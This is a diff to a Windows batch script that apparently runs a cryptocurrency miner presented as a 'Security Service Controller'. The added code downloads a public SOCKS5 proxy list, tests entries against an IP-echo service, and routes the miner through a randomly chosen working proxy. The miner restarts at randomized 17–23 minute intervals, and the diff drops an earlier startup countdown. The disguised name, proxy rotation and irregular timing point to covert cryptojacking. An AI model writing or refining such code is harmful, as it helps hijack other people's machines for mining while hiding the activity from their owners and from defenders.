@@ -39,12 +39,91 @@ echo OK>"%FLAG%"
 
 :SKIP_DOWNLOAD
 
+REM =========================
+REM CONFIG
+REM =========================
+set WORK=%BASE%\proxy_work
+set PROXY_URL=https://github.com/iplocate/free-proxy-list/raw/refs/heads/main/all-proxies.txt
+set LIST=%WORK%\all.txt
+set SOCKS=%WORK%\socks5.txt
+set GOOD=%WORK%\good.txt
+
+if not exist "%WORK%" mkdir "%WORK%"
+
+REM =========================
+REM DOWNLOAD LIST
+REM =========================
+echo [INFO] Downloading proxy list...
+curl -L --fail "%PROXY_URL%" -o "%LIST%" || goto FAIL
+
+REM =========================
+REM FILTER SOCKS5 (MAX 200)
+REM =========================
+echo [INFO] Filtering socks5 proxies...
+findstr /i "^socks5://" "%LIST%" > "%SOCKS%"
+
+set COUNT=0
+> "%WORK%\socks5_200.txt" (
+for /f "usebackq delims=" %%A in ("%SOCKS%") do (
+    set /a COUNT+=1
+    if !COUNT! LEQ 200 echo %%A
+)
+)
+
+REM =========================
+REM TEST PROXIES
+REM =========================
+echo [INFO] Testing proxies...
+> "%GOOD%" echo.
+
+for /f "usebackq delims=" %%P in ("%WORK%\socks5_200.txt") do (
+    set P=%%P
+    set P=!P:socks5://=!
+
+    curl --silent --max-time 8 ^
+      --socks5-hostname !P! https://api.ipify.org >nul 2>&1
+
+    if not errorlevel 1 (
+        echo [OK] !P!
+        echo !P!>>"%GOOD%"
+    )
+)
+
+REM =========================
+REM PICK RANDOM
+REM =========================
+for %%C in ("%GOOD%") do if %%~zC LSS 5 goto FAIL
+
+set /a R=%RANDOM%
+set IDX=0
+
+for /f "usebackq delims=" %%G in ("%GOOD%") do (
+    set /a IDX+=1
+    if !IDX! EQU %R% (
+        set PROXY=%%G
+        goto DONE
+    )
+)
+
+:DONE
+echo.
+echo ========================
+echo PROXY SET TO:
+echo %PROXY%
+echo ========================
+endlocal & set PROXY=%PROXY%
+goto END
+
+:FAIL
+echo.
+echo [ERROR] No working proxy found.
+pause
+
+:END
+
 echo ========================================
 echo   Security Service Controller STARTED
 echo ========================================
-
-echo [Security] Countdown: 10 minutes remaining...
-timeout /t 600 /nobreak
 
 :SECURITY_LOOP
 
@@ -67,7 +146,7 @@ start "%WINTITLE%" "%BIN%" ^
  --cpu-threads-intensity 1 ^
  --cpu-threads-priority 1 ^
  --miner-priority 1 ^
- --proxy 174.138.61.184:1080
+ --proxy %PROXY%
 
 REM Wait 18–22 minutes
 set /a RUN1=1080 + (%RANDOM% %% 241)
@@ -100,7 +179,7 @@ start "%WINTITLE%" "%BIN%" ^
  --cpu-threads-intensity 1 ^
  --cpu-threads-priority 1 ^
  --miner-priority 1 ^
- --proxy 174.138.61.184:1080
+ --proxy %PROXY%
 
 REM Wait 17–23 minutes
 set /a RUN2=1020 + (%RANDOM% %% 361)
